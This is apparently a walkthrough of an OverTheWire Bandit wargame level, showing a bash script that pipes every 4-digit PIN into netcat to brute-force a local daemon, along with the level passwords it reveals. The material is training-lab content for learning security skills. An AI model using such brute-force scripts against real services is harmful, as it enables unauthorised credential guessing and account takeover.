# Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

# Solution
```
bandit24@bandit:~$ nc 127.0.0.1 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

This is the prompt that we get when we connect to port 30002.
```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234
Wrong! Please enter the correct current password and pincode. Try again.
```
The connection remains, and we are to give the prompt again. Since it mentions brute-forcing in the Level Goal, we need to write a script to do it.

```
bandit24@bandit:/tmp/tmp.zAeuL9HRbK$ cat script.sh 
#!/bin/bash

HOST='127.0.0.1'
PORT=30002
PASSWORD='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'
{
for pin in {0000..9999};
do
        echo "$PASSWORD $pin"
done
} | nc $HOST $PORT | grep -v "Wrong"
```

```
bandit24@bandit:/tmp/tmp.zAeuL9HRbK$ ./script.sh 
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
